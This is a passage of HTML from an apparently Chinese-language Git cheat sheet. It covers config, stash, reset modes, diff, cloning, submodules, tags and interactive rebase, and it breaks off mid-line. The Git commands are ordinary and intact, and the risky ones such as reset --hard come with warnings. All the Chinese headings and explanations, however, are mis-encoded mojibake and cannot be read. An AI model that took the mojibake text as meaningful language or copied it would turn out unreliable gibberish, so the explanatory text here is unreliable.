class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git<span class="built_in"> config </span>[--global] user.name <span class="string">"John Doe"</span></span><br><span class="line">$ git<span class="built_in"> config </span>[--global] user.email johndoe@example.com</span><br></pre></td></tr></table></figure><h3 id="æ–‡æœ¬ç¼–è¾‘å™¨é…ç½®"><a href="#æ–‡æœ¬ç¼–è¾‘å™¨é…ç½®" class="headerlink" title="æ–‡æœ¬ç¼–è¾‘å™¨é…ç½®"></a>æ–‡æœ¬ç¼–è¾‘å™¨é…ç½®</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git<span class="built_in"> config </span>--global core.editor emacs/vim</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹é…ç½®ä¿¡æ¯"><a href="#æŸ¥çœ‹é…ç½®ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹é…ç½®ä¿¡æ¯"></a>æŸ¥çœ‹é…ç½®ä¿¡æ¯</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git<span class="built_in"> config </span>--list</span><br><span class="line">user.<span class="attribute">name</span>=Scott Chacon</span><br><span class="line">user.<span class="attribute">email</span>=schacon@gmail.com</span><br><span class="line">color.<span class="attribute">status</span>=auto</span><br><span class="line">color.<span class="attribute">branch</span>=auto</span><br><span class="line">color.<span class="attribute">interactive</span>=auto</span><br><span class="line">color.<span class="attribute">diff</span>=auto</span><br></pre></td></tr></table></figure><p>æœ‰æ—¶å€™ä¼šçœ‹åˆ°é‡å¤çš„å˜é‡åï¼Œé‚£å°±è¯´æ˜å®ƒä»¬æ¥è‡ªä¸åŒçš„é…ç½®æ–‡ä»¶ï¼ˆæ¯”å¦‚ /etc/gitconfig å’Œï½/.gitconfigï¼‰ï¼Œä¸è¿‡æœ€ç»ˆ Git å®é™…é‡‡ç”¨çš„æ˜¯æœ€åä¸€ä¸ªã€‚</p><p>ä¹Ÿå¯ä»¥é€šè¿‡<code>git config user.name</code>æ–¹å¼ç›´æ¥æŸ¥é˜…æŸä¸ªç¯å¢ƒå˜é‡çš„è®¾å®šã€‚</p><h2 id="å·¥ä½œåŒº-1"><a href="#å·¥ä½œåŒº-1" class="headerlink" title="å·¥ä½œåŒº"></a>å·¥ä½œåŒº</h2><h3 id="æ€æ ·å°†å·¥ä½œåŒºä¸­çš„å†…å®¹æäº¤åˆ°æš‚å­˜åŒºï¼Ÿ"><a href="#æ€æ ·å°†å·¥ä½œåŒºä¸­çš„å†…å®¹æäº¤åˆ°æš‚å­˜åŒºï¼Ÿ" class="headerlink" title="æ€æ ·å°†å·¥ä½œåŒºä¸­çš„å†…å®¹æäº¤åˆ°æš‚å­˜åŒºï¼Ÿ"></a>æ€æ ·å°†å·¥ä½œåŒºä¸­çš„å†…å®¹æäº¤åˆ°æš‚å­˜åŒºï¼Ÿ</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">add</span><span class="bash"> [./filename]</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘åœ¨å·¥ä½œåŒºä¿®æ”¹äº†ä¸€äº›æ–‡ä»¶ç”¨äºè°ƒè¯•ï¼Œå®Œæˆåæƒ³ä¸¢å¼ƒæ‰€æœ‰ä¿®æ”¹"><a href="#æˆ‘åœ¨å·¥ä½œåŒºä¿®æ”¹äº†ä¸€äº›æ–‡ä»¶ç”¨äºè°ƒè¯•ï¼Œå®Œæˆåæƒ³ä¸¢å¼ƒæ‰€æœ‰ä¿®æ”¹" class="headerlink" title="æˆ‘åœ¨å·¥ä½œåŒºä¿®æ”¹äº†ä¸€äº›æ–‡ä»¶ç”¨äºè°ƒè¯•ï¼Œå®Œæˆåæƒ³ä¸¢å¼ƒæ‰€æœ‰ä¿®æ”¹"></a>æˆ‘åœ¨å·¥ä½œåŒºä¿®æ”¹äº†ä¸€äº›æ–‡ä»¶ç”¨äºè°ƒè¯•ï¼Œå®Œæˆåæƒ³ä¸¢å¼ƒæ‰€æœ‰ä¿®æ”¹</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout .</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³ä¸¢å¼ƒæŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹"><a href="#æˆ‘æƒ³ä¸¢å¼ƒæŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹" class="headerlink" title="æˆ‘æƒ³ä¸¢å¼ƒæŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹"></a>æˆ‘æƒ³ä¸¢å¼ƒæŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout --<span class="string">[filename]</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æš‚å­˜è¿™äº›è°ƒè¯•çš„ä»£ç "><a href="#æˆ‘æƒ³æš‚å­˜è¿™äº›è°ƒè¯•çš„ä»£ç " class="headerlink" title="æˆ‘æƒ³æš‚å­˜è¿™äº›è°ƒè¯•çš„ä»£ç "></a>æˆ‘æƒ³æš‚å­˜è¿™äº›è°ƒè¯•çš„ä»£ç </h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git stash</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³çœ‹çœ‹æœ‰å“ªäº›æš‚å­˜çš„å†…å®¹"><a href="#æˆ‘æƒ³çœ‹çœ‹æœ‰å“ªäº›æš‚å­˜çš„å†…å®¹" class="headerlink" title="æˆ‘æƒ³çœ‹çœ‹æœ‰å“ªäº›æš‚å­˜çš„å†…å®¹"></a>æˆ‘æƒ³çœ‹çœ‹æœ‰å“ªäº›æš‚å­˜çš„å†…å®¹</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash <span class="built_in">list</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å¤åˆ¶åˆ°å·¥ä½œåŒº"><a href="#æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å¤åˆ¶åˆ°å·¥ä½œåŒº" class="headerlink" title="æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å¤åˆ¶åˆ°å·¥ä½œåŒº"></a>æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å¤åˆ¶åˆ°å·¥ä½œåŒº</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash apply <span class="symbol">stash@</span>&#123;n&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å‰ªåˆ‡åˆ°å·¥ä½œåŒº"><a href="#æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å‰ªåˆ‡åˆ°å·¥ä½œåŒº" class="headerlink" title="æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å‰ªåˆ‡åˆ°å·¥ä½œåŒº"></a>æˆ‘æƒ³å°†æŸä¸ªæš‚å­˜çš„å†…å®¹å‰ªåˆ‡åˆ°å·¥ä½œåŒº</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash <span class="keyword">pop</span> stash@&#123;n&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³åˆ é™¤æŸä¸ªæš‚å­˜"><a href="#æˆ‘æƒ³åˆ é™¤æŸä¸ªæš‚å­˜" class="headerlink" title="æˆ‘æƒ³åˆ é™¤æŸä¸ªæš‚å­˜"></a>æˆ‘æƒ³åˆ é™¤æŸä¸ªæš‚å­˜</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash drop <span class="symbol">stash@</span>&#123;n&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³åˆ é™¤æ‰€æœ‰æš‚å­˜å†…å®¹"><a href="#æˆ‘æƒ³åˆ é™¤æ‰€æœ‰æš‚å­˜å†…å®¹" class="headerlink" title="æˆ‘æƒ³åˆ é™¤æ‰€æœ‰æš‚å­˜å†…å®¹"></a>æˆ‘æƒ³åˆ é™¤æ‰€æœ‰æš‚å­˜å†…å®¹</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash <span class="built_in">clear</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å°†-git-ä¸­çš„æŸä¸ªæ–‡ä»¶å–æ¶ˆè·Ÿè¸ªï¼Œå¹¶ä¿ç•™æœ¬åœ°æ–‡ä»¶"><a href="#æˆ‘æƒ³å°†-git-ä¸­çš„æŸä¸ªæ–‡ä»¶å–æ¶ˆè·Ÿè¸ªï¼Œå¹¶ä¿ç•™æœ¬åœ°æ–‡ä»¶" class="headerlink" title="æˆ‘æƒ³å°† git ä¸­çš„æŸä¸ªæ–‡ä»¶å–æ¶ˆè·Ÿè¸ªï¼Œå¹¶ä¿ç•™æœ¬åœ°æ–‡ä»¶"></a>æˆ‘æƒ³å°† git ä¸­çš„æŸä¸ªæ–‡ä»¶å–æ¶ˆè·Ÿè¸ªï¼Œå¹¶ä¿ç•™æœ¬åœ°æ–‡ä»¶</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rm --cached <span class="string">[filename]</span></span><br></pre></td></tr></table></figure><h3 id="å·²è·Ÿè¸ªçš„æ–‡ä»¶ä¹Ÿè¦æ¯æ¬¡-add-å-commit-å—ï¼Ÿ"><a href="#å·²è·Ÿè¸ªçš„æ–‡ä»¶ä¹Ÿè¦æ¯æ¬¡-add-å-commit-å—ï¼Ÿ" class="headerlink" title="å·²è·Ÿè¸ªçš„æ–‡ä»¶ä¹Ÿè¦æ¯æ¬¡ add å commit å—ï¼Ÿ"></a>å·²è·Ÿè¸ªçš„æ–‡ä»¶ä¹Ÿè¦æ¯æ¬¡ add å commit å—ï¼Ÿ</h3><p>ä¸éœ€è¦ï¼Œå¯ä»¥ä½¿ç”¨ <code>git commit -am &#39;msg&#39;</code> åˆå¹¶ä¸¤ä¸ªå‘½ä»¤</p><h3 id="æˆ‘å›é€€åˆ°äº†æŸä¸ªæäº¤ï¼Œå¦‚ä½•å†é‡æ–°å›åˆ°æœ€æ–°çš„æäº¤ï¼Ÿ"><a href="#æˆ‘å›é€€åˆ°äº†æŸä¸ªæäº¤ï¼Œå¦‚ä½•å†é‡æ–°å›åˆ°æœ€æ–°çš„æäº¤ï¼Ÿ" class="headerlink" title="æˆ‘å›é€€åˆ°äº†æŸä¸ªæäº¤ï¼Œå¦‚ä½•å†é‡æ–°å›åˆ°æœ€æ–°çš„æäº¤ï¼Ÿ"></a>æˆ‘å›é€€åˆ°äº†æŸä¸ªæäº¤ï¼Œå¦‚ä½•å†é‡æ–°å›åˆ°æœ€æ–°çš„æäº¤ï¼Ÿ</h3><p><code>git reflog</code>å‘½ä»¤è®°å½•äº†ä½ çš„æ“ä½œè®°å½•ï¼Œåœ¨è¿™é‡Œä½ å¯ä»¥æ‰¾åˆ°æœ€æ–°çš„æäº¤ï¼Œä½¿ç”¨<code>git reset [commit-id]</code>å³å¯å›åˆ°æœªæ¥ã€‚</p><h2 id="æš‚å­˜åŒº-1"><a href="#æš‚å­˜åŒº-1" class="headerlink" title="æš‚å­˜åŒº"></a>æš‚å­˜åŒº</h2><h3 id="æˆ‘æƒ³å°†æš‚å­˜åŒºçš„æ–‡ä»¶è¿˜åŸåˆ°å·¥ä½œåŒº"><a href="#æˆ‘æƒ³å°†æš‚å­˜åŒºçš„æ–‡ä»¶è¿˜åŸåˆ°å·¥ä½œåŒº" class="headerlink" title="æˆ‘æƒ³å°†æš‚å­˜åŒºçš„æ–‡ä»¶è¿˜åŸåˆ°å·¥ä½œåŒº"></a>æˆ‘æƒ³å°†æš‚å­˜åŒºçš„æ–‡ä»¶è¿˜åŸåˆ°å·¥ä½œåŒº</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="meta">reset</span> ./<span class="meta">filename</span></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨<code>git reset</code>ä¸­ï¼Œæœ‰<code>--mixed</code>ï¼ˆé»˜è®¤ï¼‰, <code>--soft</code>ï¼Œ<code>--hard</code>ä¸‰ä¸ªå¯é€‰å‚æ•°ï¼Œå®ƒä»¬é—´æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿå…¶å®æ˜¯ä»–ä»¬çš„ä¿®æ”¹ä½œç”¨åŸŸä¸åŒï¼Œå…·ä½“å¯çœ‹ä¸‹è¡¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯·è°¨æ…ä½¿ç”¨<code>--hard</code>ï¼Œè¿™ä¼šä½¿ä½ å·¥ä½œåŒºçš„å†…å®¹è¢«è¦†ç›–ï¼</p></blockquote><table><thead><tr><th align="center"></th><th align="center">å·¥ä½œåŒº</th><th align="center">æš‚å­˜åŒº</th><th align="center">æœ¬åœ°ä»“åº“</th></tr></thead><tbody><tr><td align="center"><code>--soft</code></td><td align="center">âŒ</td><td align="center">âŒ</td><td align="center">âœ…</td></tr><tr><td align="center"><code>--mixed</code></td><td align="center">âŒ</td><td align="center">âœ…</td><td align="center">âœ…</td></tr><tr><td align="center"><code>--hard</code></td><td align="center">âœ…</td><td align="center">âœ…</td><td align="center">âœ…</td></tr></tbody></table><h3 id="æˆ‘æƒ³å¯¹æ¯”å·¥ä½œåŒºåŸŸæš‚å­˜åŒºçš„æŸä¸ªæ–‡ä»¶å·®å¼‚"><a href="#æˆ‘æƒ³å¯¹æ¯”å·¥ä½œåŒºåŸŸæš‚å­˜åŒºçš„æŸä¸ªæ–‡ä»¶å·®å¼‚" class="headerlink" title="æˆ‘æƒ³å¯¹æ¯”å·¥ä½œåŒºåŸŸæš‚å­˜åŒºçš„æŸä¸ªæ–‡ä»¶å·®å¼‚"></a>æˆ‘æƒ³å¯¹æ¯”å·¥ä½œåŒºåŸŸæš‚å­˜åŒºçš„æŸä¸ªæ–‡ä»¶å·®å¼‚</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff <span class="string">[filename]</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å¯¹æ¯”æš‚å­˜åŒºä¸ä»“åº“æŸä¸ªæ–‡ä»¶çš„å·®å¼‚"><a href="#æˆ‘æƒ³å¯¹æ¯”æš‚å­˜åŒºä¸ä»“åº“æŸä¸ªæ–‡ä»¶çš„å·®å¼‚" class="headerlink" title="æˆ‘æƒ³å¯¹æ¯”æš‚å­˜åŒºä¸ä»“åº“æŸä¸ªæ–‡ä»¶çš„å·®å¼‚"></a>æˆ‘æƒ³å¯¹æ¯”æš‚å­˜åŒºä¸ä»“åº“æŸä¸ªæ–‡ä»¶çš„å·®å¼‚</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">diff </span>--<span class="keyword">cached </span>[filename]</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æ¯”è¾ƒå·¥ä½œåŒºä¸æœ¬åœ°ä»“åº“çš„å·®å¼‚"><a href="#æˆ‘æƒ³æ¯”è¾ƒå·¥ä½œåŒºä¸æœ¬åœ°ä»“åº“çš„å·®å¼‚" class="headerlink" title="æˆ‘æƒ³æ¯”è¾ƒå·¥ä½œåŒºä¸æœ¬åœ°ä»“åº“çš„å·®å¼‚"></a>æˆ‘æƒ³æ¯”è¾ƒå·¥ä½œåŒºä¸æœ¬åœ°ä»“åº“çš„å·®å¼‚</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git diff HEAD</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æ¯”è¾ƒå½“å‰æä»·ä¸æŸä¸ªå†å²æäº¤çš„å·®å¼‚"><a href="#æˆ‘æƒ³æ¯”è¾ƒå½“å‰æä»·ä¸æŸä¸ªå†å²æäº¤çš„å·®å¼‚" class="headerlink" title="æˆ‘æƒ³æ¯”è¾ƒå½“å‰æä»·ä¸æŸä¸ªå†å²æäº¤çš„å·®å¼‚"></a>æˆ‘æƒ³æ¯”è¾ƒå½“å‰æä»·ä¸æŸä¸ªå†å²æäº¤çš„å·®å¼‚</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff [<span class="keyword">commit</span>-<span class="keyword">id</span>]</span><br></pre></td></tr></table></figure><h2 id="æœ¬åœ°ä»“åº“-1"><a href="#æœ¬åœ°ä»“åº“-1" class="headerlink" title="æœ¬åœ°ä»“åº“"></a>æœ¬åœ°ä»“åº“</h2><h3 id="æ€ä¹ˆå°†è¿œç¨‹ä»“åº“å…‹éš†åˆ°æœ¬åœ°ï¼Œå¹¶å‘½åä¸ºprojï¼Ÿ"><a href="#æ€ä¹ˆå°†è¿œç¨‹ä»“åº“å…‹éš†åˆ°æœ¬åœ°ï¼Œå¹¶å‘½åä¸ºprojï¼Ÿ" class="headerlink" title="æ€ä¹ˆå°†è¿œç¨‹ä»“åº“å…‹éš†åˆ°æœ¬åœ°ï¼Œå¹¶å‘½åä¸ºprojï¼Ÿ"></a>æ€ä¹ˆå°†è¿œç¨‹ä»“åº“å…‹éš†åˆ°æœ¬åœ°ï¼Œå¹¶å‘½åä¸ºprojï¼Ÿ</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">clone</span> <span class="title">[repo_url</span>] [proj]</span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆæ›´æ–°æœ¬åœ°ä»“åº“ï¼Ÿ"><a href="#æ€ä¹ˆæ›´æ–°æœ¬åœ°ä»“åº“ï¼Ÿ" class="headerlink" title="æ€ä¹ˆæ›´æ–°æœ¬åœ°ä»“åº“ï¼Ÿ"></a>æ€ä¹ˆæ›´æ–°æœ¬åœ°ä»“åº“ï¼Ÿ</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch <span class="variable">&amp;&amp;</span> git <span class="meta">merge</span></span><br></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git pull</span><br></pre></td></tr></table></figure><h3 id="å­æ¨¡å—åŠŸèƒ½æ€ä¹ˆç”¨ï¼Ÿ"><a href="#å­æ¨¡å—åŠŸèƒ½æ€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="å­æ¨¡å—åŠŸèƒ½æ€ä¹ˆç”¨ï¼Ÿ"></a>å­æ¨¡å—åŠŸèƒ½æ€ä¹ˆç”¨ï¼Ÿ</h3><p>æ·»åŠ å­æ¨¡å—</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">submodule </span><span class="keyword">add </span>url repo_name</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–å­æ¨¡å—</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">submodule </span>init</span><br></pre></td></tr></table></figure><p>æ›´æ–°å­æ¨¡å—</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">submodule </span>update</span><br></pre></td></tr></table></figure><h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><h3 id="æˆ‘æƒ³æŸ¥çœ‹æ‰€æœ‰çš„æ ‡ç­¾"><a href="#æˆ‘æƒ³æŸ¥çœ‹æ‰€æœ‰çš„æ ‡ç­¾" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æ‰€æœ‰çš„æ ‡ç­¾"></a>æˆ‘æƒ³æŸ¥çœ‹æ‰€æœ‰çš„æ ‡ç­¾</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">tag</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³åˆ—å‡º1-8-5ç³»åˆ—çš„æ ‡ç­¾"><a href="#æˆ‘æƒ³åˆ—å‡º1-8-5ç³»åˆ—çš„æ ‡ç­¾" class="headerlink" title="æˆ‘æƒ³åˆ—å‡º1.8.5ç³»åˆ—çš„æ ‡ç­¾"></a>æˆ‘æƒ³åˆ—å‡º1.8.5ç³»åˆ—çš„æ ‡ç­¾</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">tag</span> <span class="title">-l</span> 'v1.<span class="number">8.5</span>*'</span><br></pre></td></tr></table></figure><h3 id="æˆ‘è¦æŸ¥çœ‹æŸä¸ªæ ‡ç­¾ä¿¡æ¯"><a href="#æˆ‘è¦æŸ¥çœ‹æŸä¸ªæ ‡ç­¾ä¿¡æ¯" class="headerlink" title="æˆ‘è¦æŸ¥çœ‹æŸä¸ªæ ‡ç­¾ä¿¡æ¯"></a>æˆ‘è¦æŸ¥çœ‹æŸä¸ªæ ‡ç­¾ä¿¡æ¯</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git show <span class="string">[tagname]</span></span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆåˆ›å»ºä¸€ä¸ªæ ‡ç­¾ï¼Ÿ"><a href="#æ€ä¹ˆåˆ›å»ºä¸€ä¸ªæ ‡ç­¾ï¼Ÿ" class="headerlink" title="æ€ä¹ˆåˆ›å»ºä¸€ä¸ªæ ‡ç­¾ï¼Ÿ"></a>æ€ä¹ˆåˆ›å»ºä¸€ä¸ªæ ‡ç­¾ï¼Ÿ</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">tag</span> <span class="title">-a</span> [tagname] -m <span class="string">"message"</span></span><br></pre></td></tr></table></figure><blockquote><p>è¯¥å½¢å¼æ˜¯é™„æ³¨æ ‡ç­¾ï¼ŒåŒ…å«äº†åˆ›å»ºæ ‡ç­¾è€…å§“åã€emailã€æ—¶é—´ä»¥åŠæ ‡ç­¾ä¿¡æ¯ã€‚å¦å¤–æœ‰ä¸€ç§è½»é‡æ ‡ç­¾<code>git tag [tagname]</code>ï¼Œè¯¥æ ‡ç­¾ç±»å‹ç”±äºåŒ…å«äº†è¾ƒå°‘çš„ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸è¢«æ¨èã€‚</p></blockquote><h3 id="æ€ä¹ˆæ¨é€æ ‡ç­¾åˆ°è¿œç¨‹ä»“åº“ï¼Ÿ"><a href="#æ€ä¹ˆæ¨é€æ ‡ç­¾åˆ°è¿œç¨‹ä»“åº“ï¼Ÿ" class="headerlink" title="æ€ä¹ˆæ¨é€æ ‡ç­¾åˆ°è¿œç¨‹ä»“åº“ï¼Ÿ"></a>æ€ä¹ˆæ¨é€æ ‡ç­¾åˆ°è¿œç¨‹ä»“åº“ï¼Ÿ</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>git push</code> å‘½ä»¤å¹¶ä¸ä¼šä¼ é€æ ‡ç­¾åˆ°è¿œç¨‹ä»“åº“æœåŠ¡å™¨ä¸Šã€‚ åœ¨åˆ›å»ºå®Œæ ‡ç­¾åä½ å¿…é¡»æ˜¾å¼åœ°æ¨é€æ ‡ç­¾åˆ°å…±äº«æœåŠ¡å™¨ä¸Šã€‚ </p><p>æ¨é€å•ä¸ªæ ‡ç­¾ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">push</span> <span class="built_in">origin</span> [tagname]</span><br></pre></td></tr></table></figure><p>å°†æ‰€æœ‰ä¸åœ¨è¿œç¨‹ä»“åº“çš„æ ‡ç­¾å…¨éƒ¨æ¨é€ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">push</span> <span class="built_in">origin</span> --tags</span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆåˆ é™¤æ ‡ç­¾ï¼Ÿ"><a href="#æ€ä¹ˆåˆ é™¤æ ‡ç­¾ï¼Ÿ" class="headerlink" title="æ€ä¹ˆåˆ é™¤æ ‡ç­¾ï¼Ÿ"></a>æ€ä¹ˆåˆ é™¤æ ‡ç­¾ï¼Ÿ</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">tag</span> <span class="title">-d</span> [tagname]</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šè¯¥å‘½ä»¤å¹¶ä¸ä¼šä»ä»»ä½•è¿œç¨‹ä»“åº“ä¸­ç§»é™¤è¿™ä¸ªæ ‡ç­¾ï¼Œä½ å¿…é¡»ä½¿ç”¨ <code>git push [remote] :refs/tags/[tagname]</code> æ¥æ›´æ–°ä½ çš„è¿œç¨‹ä»“åº“ã€‚</p></blockquote><h2 id="å˜åŸº"><a href="#å˜åŸº" class="headerlink" title="å˜åŸº"></a>å˜åŸº</h2><p>å˜åŸºçš„å‘½ä»¤ï¼š<code>git rebase -i [è¦ä¿®æ”¹ commit çš„ä¸Šä¸€ä¸ª commit]</code></p><blockquote><p>è¯·æ³¨æ„ï¼å˜åŸºæ˜¯ä¸€æŠŠåˆ©å‰‘ï¼Œåˆç†çš„ä½¿ç”¨ä¼šè®©ä½ çš„åˆ†æ”¯æ›´åŠ ç®€æ´å’Œçµæ´»ï¼Œæ»¥ç”¨åˆ™ä¼šå¯¼è‡´åˆ†æ”¯çš„æ··ä¹±ã€‚è¯·è°¨æ…ä½¿ç”¨ rebaseï¼Œå°¤å…¶æ˜¯å›¢é˜Ÿåˆä½œé¡¹ç›®ï¼Œå› ä¸ºå®ƒä¼šä¿®æ”¹å†å²ä¿¡æ¯ï¼Œå¯¼è‡´ä¿¡æ¯å†²çª<br>åœ¨å±é™©æ“ä½œå‰å¯ä»¥å…ˆåœ¨å‰¯æœ¬åˆ†æ”¯è¿›è¡Œæ“ä½œï¼Œç¡®è®¤ç»“æœæ˜¯é¢„æœŸåå†è¡Œæ“ä½œã€‚</p></blockquote><blockquote><p>å˜åŸºçš„æ¦‚å¿µå¯èƒ½éš¾ä»¥ç†è§£ï¼Œä½ å¯ä»¥åˆ°<a href="https://git-scm.com/book/zh/v2/Git-åˆ†æ”¯-å˜åŸº" target="_blank" rel="noopener">è¿™é‡Œ</a>å­¦ä¹ ä¸€ä¸‹ã€‚</p></blockquote><p>å½“æˆ‘ä»¬ä½¿ç”¨<code>git rebase -i 5f2452b2  8f33126c</code>è°ƒå‡ºäº†å˜åŸºçª—å£æ—¶ï¼Œä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼Œè¯·æ³¨æ„å…¶ä¸­çš„ Commands éƒ¨åˆ†ï¼Œæ¯ä¸ªå‘½ä»¤åéƒ½æœ‰è¯´æ˜ï¼Œæˆ‘ä»¬åªéœ€è¦æŒ‰ç…§è¯´æ˜æ“ä½œå³å¯ã€‚å¦‚æœä¸æ˜ç™½å…¶å®é™…åŠ¨ä½œå’Œç»“æœï¼Œè¯·åˆ›å»ºä¸€ä¸ªæµ‹è¯•ä»“åº“æ¼”ç»ƒä¸€ä¸‹ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pick cacc52da <span class="keyword">add</span><span class="bash">: qrcode</span></span><br><span class="line">pick f072ef48 update: indexeddb hack</span><br><span class="line">pick <span class="number">4</span>e84901a feat: <span class="keyword">add</span><span class="bash"> indexedDB floder</span></span><br><span class="line">pick <span class="number">8</span>f33126c feat: <span class="keyword">add</span><span class="bash"> test2.js</span></span><br><span class="line"></span><br><span class="line"><span 